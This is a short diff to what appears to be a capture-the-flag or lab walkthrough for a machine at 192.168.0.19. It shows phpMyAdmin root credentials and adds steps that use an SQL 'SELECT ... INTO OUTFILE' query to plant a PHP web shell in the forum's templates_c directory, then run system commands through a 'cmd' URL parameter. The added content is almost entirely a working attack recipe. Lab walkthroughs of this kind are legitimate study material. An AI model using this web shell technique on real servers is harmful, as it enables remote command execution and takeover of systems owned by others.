@@ -85,4 +85,10 @@
         https://192.168.0.19/phpmyadmin/
         Connect with root:Fg-'kKXBj87E:aJ$
 
+    - Injecting cmd to the system:
+        Go to the page "SQL" and enter:
+            SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/monfichier2.php" -- 1
+        Now go to the page https://192.168.0.19/forum/templates_c/monfichier2.php?cmd=whoami
+        We can now enter cmd (replace whoami by whatever you want, you can put spaces)
+
 
